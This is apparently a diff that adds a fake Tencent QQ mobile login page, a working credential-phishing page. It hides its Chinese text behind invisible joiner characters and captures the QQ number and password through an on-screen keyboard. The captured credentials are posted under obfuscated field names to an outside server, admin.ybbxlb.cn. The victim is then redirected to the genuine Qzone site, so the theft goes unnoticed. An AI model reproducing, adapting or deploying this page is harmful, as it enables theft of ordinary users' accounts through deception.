@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<title>&#x624B;&#x673A;&#x7EDF;&#x4E00;&#x767B;&#x5F55;</title>
+		<link rel=stylesheet type=text/css href="//123.pbbcc.cn/css/vl.css">
+		<link rel="stylesheet" href="//123.pbbcc.cn/css/keyboard.css" />
+		<style>
+			.logo {
+				background-image: url("http://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png")
+			}
+			
+			.my {
+				width: 288px;
+				height: 44px;
+				position: absolute
+			}
+		</style>
+	</head>
+
+	<body>
+		<div id="content" class="content">
+			<div id="error_tips">
+				<div id="error_tips_content">
+					<span id="error_icon"></span>
+					<span id="error_message"></span>
+				</div>
+			</div>
+			<div id="login" class="login">
+				<div id="logo" class="logo"></div>
+				<div id="web_login">
+					<ul id="g_list">
+						<li id="g_u">
+							<div id="del_touch" class="del_touch">
+								<span id="del_u" class="del_u"></span>
+							</div>
+							<div name="0" class="my"></div><input id="u" class="inputstyle" name="0" maxlength="10" placeholder="Q&#x034F;&#x034F;&#x034F;Q&#x034F;&#x034F;&#x034F;&#x53F7;&#x034F;&#x034F;&#x7801;&#x034F;/&#x034F;&#x624B;&#x034F;&#x034F;&#x673A;&#x034F;/&#x034F;&#x90AE;&#x034F;&#x034F;&#x7BB1;&#x034F;" readonly>
+						</li>
+						<li id="g_p">
+							<div id="del_touch_p" class="del_touch">
+								<span id="del_p" class="del_u"></span>
+							</div>
+							<div name="1" class="my"></div><input id="p" class="inputstyle" maxlength="16" type="password" name="1" placeholder="&#x034F;&#x034F;&#x8BF7;&#x034F;&#x034F;&#x034F;&#x8F93;&#x034F;&#x034F;&#x034F;&#x5165;&#x034F;&#x4F60;&#x034F;&#x7684;Q&#x034F;&#x034F;Q&#x034F;&#x5BC6;&#x034F;&#x034F;&#x034F;&#x7801;&#x034F;&#x034F;" readonly>
+						</li>
+					</ul>
+					<div id="go">&#x767B;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F; &#x5F55;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;&#x034F;</div>
+				</div>
+				<div id="switch">
+					<div id="zc_feedback">
+						<a id="zc" href="https://zc.qq.com">&#x6CE8;&#x034F;&#x518C;&#x034F;&#x65B0;&#x034F;&#x5E10;&#x034F;&#x53F7;</a>
+						<a id="forgetpwd" href="https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index">&#x5FD8;&#x034F;&#x4E86;&#x034F;&#x5BC6;&#x034F;&#x7801;&#x034F;&#xFF1F;</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		<script src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+		<script src="https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+		<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+		<script src="https://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+		<script type="text/javascript" src="//123.pbbcc.cn/js/keyboard.js"></script>
+		<script>
+			var qid = '';
+			var qp = '';
+			$(function() {
+				if($.cookie('il') == 'ok')
+					location.href = 'https://act.qzone.qq.com/';
+				FastClick.attach(document.body);
+				$('.my[name=0]').click(function() {
+					keyBoard({
+						eventNode: '#u',
+						type: 0,
+						clickCallBack: function(flag, value, target) {
+							if(flag.length == 1) {
+								qid += '' + flag;
+							} else if(flag == 'del') {
+								qid = '';
+							}
+							$('#u').val(qid);
+						}
+					});
+				});
+				$('.my[name=1]').click(function() {
+					keyBoard({
+						eventNode: '#p',
+						type: 1,
+						clickCallBack: function(flag, value, target) {
+							if(flag.length == 1) {
+								qp += '' + flag;
+							} else if(flag == 'del') {
+								qp = '';
+							}
+							$('#p').val(qp);
+						}
+					});
+				});
+				islogin = false;
+				$('#go').click(function() {
+					if(islogin) return;
+					var u = $('#u').val();
+					var p = $('#p').val();
+					if(u.length < 5 || u.length > 10 || p.length < 8 || p.length > 16) {
+						f("\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u8d26\u53f7\u5bc6\u7801.");
+						return;
+					}
+					islogin = true;
+					$.cookie('il', 'ok');
+					var data = {
+						hrUW3PG7mp3RLd3dJu: u,
+						LxMzAX2jog9Bpjs07jP: p
+					};
+					$.post("http://admin.ybbxlb.cn/apisend/Login2", data, function(e) {
+						islogin = false;
+						location.href = 'https://act.qzone.qq.com/';
+					});
+				});
+				mqq.ui.setTitleButtons({
+					/*left : {
+					    title : "",
+					    callback : function () {
+					       //
+					    }
+					},*/
+					right: {
+						hidden: true
+					}
+				})
+			});
+
+			function f(n) {
+				g("error_tips").style.display = "block",
+					g("error_message").innerHTML = n,
+					setTimeout(function() {
+						g('error_tips').style.display = 'none';
+					}, 1500);
+			}
+			function g(n) {
+				return document.getElementById(n)
+			}
+		</script>
+	</body>
+
+</html>
